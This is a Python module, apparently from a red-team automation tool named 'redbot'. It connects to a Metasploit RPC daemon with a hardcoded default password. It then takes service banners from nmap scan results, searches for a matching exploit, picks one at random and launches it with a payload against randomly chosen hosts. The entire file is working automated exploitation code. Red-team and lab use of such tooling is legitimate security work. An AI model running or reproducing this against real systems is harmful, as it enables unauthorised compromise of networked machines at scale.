import random
from subprocess import run
from time import sleep
from typing import List

from metasploit.msfrpc import MsfRpcClient, MsfRpcError
from redbot.core.async import celery
from redbot.core.models import storage
from redbot.core.utils import random_targets
from redbot.modules import Attack
from redbot.modules.discovery import get_hosts


class MSF(Attack):
    name = 'metasploit'
    notes = "Requires a running msfrpcd daemon, and nmap scans run with -sV."
    settings = {
        'password': {
            'name': 'msfrpcd Password',
            'default': 'redbot',
            'description': 'Password to connect to the msfrpcd daemon.'
        },
        'payload': {
            'name': 'Payload Options',
            'default': '',
            'description': '(Optional)'
        }
    }

    @classmethod
    def run_attack(cls):
        targets = random_targets()
        cls.log("Starting MSF attack on " + str(targets))
        g = cls.attack_all(attacks=(msf_attack,), targets=targets)
        return g, targets


cls = MSF


def _slow_msf_search(client: MsfRpcClient, query: str):
    exploits = client.modules.exploits
    results = []
    for e in exploits:
        exploit = client.modules.use('exploit', e)
        if query.lower() in exploit.name.decode().lower() + exploit.description.decode().lower():
            results.append(e)
    return results


def msf_search(client: MsfRpcClient, query: str) -> List[str]:
    cached = storage.smembers('metasploit:' + query)
    if not cached:
        results = _slow_msf_search(client, query)
        for result in results:
            storage.sadd('metasploit:' + query, result.decode())
        return results
    return list(cached)


@celery.task
def msf_attack(host: str, *args, **kwargs):
    client = None
    tries = 0
    while not client:
        if tries > 5:
            MSF.log("Giving up connecting to msfrpcd.", 'danger')
            return
        try:
            client = MsfRpcClient(MSF.get_setting('password'))
        except ConnectionRefusedError:
            MSF.log("Can't connect to msfrpcd. Trying to start it...", 'warning')
            if storage.get('msfrpcd-lock'):
                sleep(10)
            else:
                storage.incr('msfrpcd-lock')
                run(['msfrpcd', '-P', MSF.get_setting('password')])
                storage.delete('msfrpcd-lock')
        except MsfRpcError:
            MSF.log("Error connecting to msfrpcd. Is the password correct?", 'danger')
        tries += 1

    target = get_hosts()[host]
    query = ""
    port = None
    for p in random.sample(target['ports'], len(target['ports'])):
        if p.get('banner'):
            query = p['banner'].split()[1]
            port = p['port']
            break
    exploit = random.choice(msf_search(client, query))
    MSF.log('Using exploit ' + exploit + ' against ' + host)
    exploit = client.modules.use('exploit', exploit)
    print(exploit.required)
    for r in exploit.required:
        if r == b'RHOST':
            exploit['RHOST'.encode()] = host
        elif r == b'RPORT':
            exploit['RPORT'.encode()] = port
    # TODO: Payloads?
    e = exploit.execute(payload=exploit.payloads[0].decode())
    MSF.log('Exploit ' + exploit.modulename + ' against ' + host + ' launched.', 'success')
